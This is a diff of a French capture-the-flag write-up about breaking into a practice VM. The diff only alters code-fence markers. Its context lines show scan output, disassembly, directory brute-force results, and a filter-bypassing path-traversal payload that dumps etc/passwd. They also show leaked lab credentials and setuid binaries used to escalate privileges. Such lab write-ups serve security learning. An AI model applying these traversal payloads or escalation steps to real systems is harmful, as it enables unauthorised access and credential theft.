@@ -17,7 +17,7 @@ Prêts pour l'aventure ?
 Allez hop on y va
 -----------------
 
-```plain
+```
 Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-08 22:15 CEST
 Nmap scan report for 192.168.1.29
 Host is up (0.00016s latency).
@@ -158,7 +158,7 @@ No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RU
 
 Le programme est court et tout a lieu dans le main() :  
 
-```plain
+```
    0x000000000040071c <main+0>:   push   %rbp
    0x000000000040071d <main+1>:   mov    %rsp,%rbp
    0x0000000000400720 <main+4>:   sub    $0x600,%rsp
@@ -251,7 +251,7 @@ All work and no play makes Jack a dull boy
 
 Comme vu plus tôt, le path *super\_secret* pointe vers une page de login. Un petit coup de *dirb* révèle l'existence de scripts supplémentaires :  
 
-```plain
+```
 http://192.168.1.29/super_secret_login_path_muhahaha/check.php
 http://192.168.1.29/super_secret_login_path_muhahaha/index.php
 http://192.168.1.29/super_secret_login_path_muhahaha/login.php
@@ -456,7 +456,7 @@ Si on met *intruder=../server.php* alors BANG ! On retrouve *server.php* qui est
 
 Le script fait en réalité un *str\_replace* tout bête et si on passe *....//....//....//....//....//....//....//....//etc/passwd* j'obtiens :  
 
-```plain
+```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 bin:x:2:2:bin:/bin:/bin/sh
@@ -515,7 +515,7 @@ fd.close()
 
 Ce qui donne :  
 
-```plain
+```
 Contenu trouve avec /var/log/lastlog
 Contenu trouve avec /var/log/wtmp
 Contenu trouve avec /var/run/utmp
@@ -630,7 +630,7 @@ drwx------ 4 jack jack 4096 Jun 22 18:28 ..
 
 Et un autre identifiant donnant un accès limité à la base MySQL pour obtenir encore un autre mot de passe :  
 
-```plain
+```
 mysql> select * from users;
 +----------+-----------+
 | username | password  |
@@ -801,7 +801,7 @@ $ gpg secret.pgp
 
 Le fichier déchiffré :  
 
-```plain
+```
 Ok Jack. I've created the account 'milk_4_life' as per your request. Please stop emailing me about this now or I'm going to talk to HR like we discussed. 
 
 The password is '4J0WWvL5nS'
@@ -812,7 +812,7 @@ What else ?
 
 Une fois connecté en tant que *milk\_4\_life* on voit un exécutable setuid george :  
 
-```plain
+```
 ---s--x--x 1 george george 5743 Jun 19 18:24 game
 ```
 
@@ -840,7 +840,7 @@ Port ouverts :
 
 Et côté serveur on obtient :  
 
-```plain
+```
 Lol nope
 ```
 
@@ -891,7 +891,7 @@ sock.close()
 
 Ce qui nous permet au bout d'un moment d'obtenir autre chose qu'une question :  
 
-```plain
+```
 Final Score: 133869
 
 !*!*!*!*! Congratulations, new high score (133869) !*!*!*!*!
@@ -911,7 +911,7 @@ milk_4_life@hell:~$ find /  -newerct '2014-07-12 14:10' 2> /dev/null  | grep -v 
 
 Le binaire *lesson101* est devenu setuid george (*George is inside !!!*)  
 
-```plain
+```
 ---s--x--x 1 george george 6531 Jun 19 15:13 /usr/bin/lesson101
 ```
 
